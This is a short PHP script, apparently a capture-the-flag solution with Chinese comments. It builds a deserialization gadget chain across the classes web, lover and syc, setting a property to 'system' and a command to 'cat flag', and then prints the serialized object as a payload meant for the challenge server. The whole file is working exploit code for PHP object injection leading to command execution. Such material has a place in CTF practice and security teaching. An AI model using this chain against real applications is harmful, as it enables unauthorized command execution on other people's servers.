<?php
class web{
public  $eva1;
public $interesting;
};
class lover{
    public $QW;
    public $yxx;
}
class syc{
    public $cuit;
}
// 创建一个web对象
$web = new web();
// 将web对象的eva1属性设置为system函数
$web->eva1 = "system";
// 将web对象的interesting属性设置为任意命令，例如ls
$web->interesting = "cat flag";
// 创建一个lover对象
$lover = new lover();
// 将lover对象的yxx属性设置为web对象
$lover->yxx = $web;
// 将lover对象的QW属性设置为任意字符串，例如test
$lover->QW = "test";
// 创建一个syc对象
$syc = new syc();
// 将syc对象的cuit属性设置为lover对象
$syc->cuit = $lover;
// 将syc对象序列化，并进行urlencode编码
$payload = serialize($syc);
// 发送POST请求到题目服务器，url参数为payload
echo $payload;
?>
